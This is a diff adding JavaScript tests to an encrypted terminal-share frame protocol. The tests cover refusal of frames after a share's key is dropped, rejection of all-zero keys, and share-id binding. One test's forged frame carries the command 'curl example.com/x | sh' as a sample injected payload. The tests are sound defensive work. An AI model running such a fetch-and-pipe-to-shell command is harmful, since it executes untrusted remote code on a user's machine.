@@ -125,6 +125,42 @@ test('junk, empty payloads and unknown types are refused', () => {
   assert.equal(frames.open(context, futureVersion), null);
 });
 
+test('a retired share opens nothing', () => {
+  const sender = session();
+  const frame = frames.seal(sender, Buffer.from('ls\r\n'));
+
+  // A share drops its key the moment it is taken out of service. Anything
+  // still arriving on a socket that has not finished closing must fail to
+  // open rather than be handed to whatever the frame claims to be.
+  for (const key of [null, undefined, Buffer.alloc(0), Buffer.alloc(16)]) {
+    assert.equal(frames.open({ key, shareId: SHARE_ID, seen: new Map() }, frame), null);
+  }
+});
+
+test('an all-zero key is not a usable substitute for a dropped one', () => {
+  // Zeroing a key in place would leave a perfectly valid AES key behind, so
+  // frames forged under it would authenticate. Sealing must refuse instead.
+  const zeroed = session({ key: Buffer.alloc(32) });
+  const forged = frames.seal(zeroed, Buffer.from('curl example.com/x | sh\r\n'));
+
+  assert.equal(frames.open({ key: null, shareId: SHARE_ID, seen: new Map() }, forged), null);
+  assert.throws(() => frames.seal(session({ key: null }), Buffer.from('x')), /no key/);
+});
+
+test('the share id binds the same whether given as text or bytes', () => {
+  const sender = session();
+  const frame = frames.seal({ ...sender, shareId: Buffer.from(SHARE_ID, 'utf8') }, Buffer.from('hi'));
+
+  const asText = frames.open({ key: sender.key, shareId: SHARE_ID, seen: new Map() }, frame);
+  assert.equal(asText.plaintext.toString(), 'hi');
+
+  const otherShare = frames.open(
+    { key: sender.key, shareId: Buffer.from('shr_BBBBBBBBBBBBBBBBBBBBBB', 'utf8'), seen: new Map() },
+    frame,
+  );
+  assert.equal(otherShare, null);
+});
+
 test('output is split to stay under the relay frame ceiling', () => {
   const big = Buffer.alloc(frames.MAX_CHUNK_BYTES * 2 + 11, 0x61);
   const parts = frames.chunk(big);
